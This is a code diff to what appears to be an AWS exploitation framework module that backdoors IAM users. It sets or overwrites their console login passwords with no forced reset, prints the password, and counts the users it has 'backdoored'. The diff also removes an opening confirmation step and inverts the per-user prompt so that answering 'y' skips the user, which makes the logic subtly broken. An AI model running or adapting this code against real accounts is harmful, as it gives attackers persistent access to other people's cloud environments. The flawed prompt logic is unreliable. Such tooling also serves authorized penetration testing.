@@ -3,6 +3,8 @@ import argparse
 from random import choice
 import string
 
+from botocore.exceptions import ClientError
+
 
 module_info = {
     # Name of the module (should be the same as the filename)
@@ -57,18 +59,13 @@ def main(args, pacu_main):
             users = [args.usernames]
 
     else:
-        all = input('No user names were passed in as arguments, do you want to enumerate all users and get a prompt for each one (y) or exit (n)? ')
-        if all.lower() == 'n':
-            print('Exiting...')
-            return
-
         if fetch_data(['IAM', 'Users'], 'enum_users_roles_policies_groups', '--users') is False:
-            print('Pre-req module not run successfully. Exiting...')
+            print('FAILURE')
+            print('  SUB-MODULE EXECUTION FAILED')
             return
         for user in session.IAM['Users']:
             if 'PasswordLastUsed' not in user:
                 users.append(user['UserName'])
-
     try:
         password_policy = client.get_account_password_policy()
     except:
@@ -79,47 +76,44 @@ def main(args, pacu_main):
     target_user = ''
     password = create_valid_password(password_policy)
     summary_data['backdoored_password_count'] = 0
+    print('Modifying user passwords...')
+    print('Password: {}'.format(password))
+
+    if args.update:
+        func = 'update_login_profile'
+    else:
+        func = 'create_login_profile'
+    caller = getattr(client, func)
+
     for user in users:
         if args.usernames is None:
-            target_user = input('  Do you want to target the user {} (y/n)? '.format(user))
-
-        if target_user == 'y' or args.usernames is not None:
-            print('  User: {}\n'.format(user))
-
-            if args.update is False:
-                try:
-                    client.create_login_profile(
-                        UserName=user,
-                        Password=password,
-                        PasswordResetRequired=False
-                    )
-                    print('  Password: {}\n'.format(password))
-                    summary_data['backdoored_password_count'] += 1
-                except Exception as error:
-                    print('  Failed to set password: {} most likely already has a password. The error is shown here:\n{}'.format(user, error))
-
-                    quit = input('Based on the error returned, would you like to continue to the next user (y) or cancel (n)? ')
-                    if quit == 'n':
-                        print('  User cancelled. Quitting.')
-                        return summary_data
-
+            target_user = input('  User: {} (y/n)? '.format(user))
+            if target_user.lower() == 'y':
+                continue
+        else:
+            print('  User: {}'.format(user))
+        try:
+            caller(
+                UserName=user,
+                Password=password,
+                PasswordResetRequired=False)
+            print('    Password Applied')
+            summary_data['backdoored_password_count'] += 1
+        except ClientError as error:
+            print('    FAILURE:')
+            code = error.response['Error']['Code']
+            if code == 'AccessDenied':
+                print('      MISSING NEEDED PERMISSIONS')
+            elif code == 'EntityAlreadyExists':
+                print('      LOGIN PROFILE ALREADY EXISTS')
             else:
-                try:
-                    client.update_login_profile(
-                        UserName=user,
-                        Password=password,
-                        PasswordResetRequired=False
-                    )
-                    print('  Password: {}\n'.format(password))
-                    summary_data['backdoored_password_count'] += 1
-                except Exception as error:
-                    print('  Failed to update password: {} most likely doesn\'t have a login profile. The error is shown here:\n{}'.format(user, error))
-
-                    quit = input('Based on the error returned, would you like to continue to the next user (y) or cancel (n)? ')
-                    if quit == 'n':
-                        print('  User cancelled. Quitting.')
-                        return summary_data
-
+                print('  UNKNOWN:')
+                print('    {}'.format(code))
+                print(error)
+            quit = input('    Continue? (y/n)')
+            if quit == 'n':
+                print('    Exiting...')
+                return summary_data
     print('{} completed.\n'.format(module_info['name']))
     return summary_data
 
@@ -127,7 +121,8 @@ def main(args, pacu_main):
 def summary(data, pacu_main):
     out = ''
     if 'backdoored_password_count' in data:
-        out += '  {} user(s) successfully backdoored.\n'.format(data['backdoored_password_count'])
+        count = data['backdoored_password_count']
+        out += '  {} user(s) successfully backdoored.\n'.format(count)
     return out
 
 
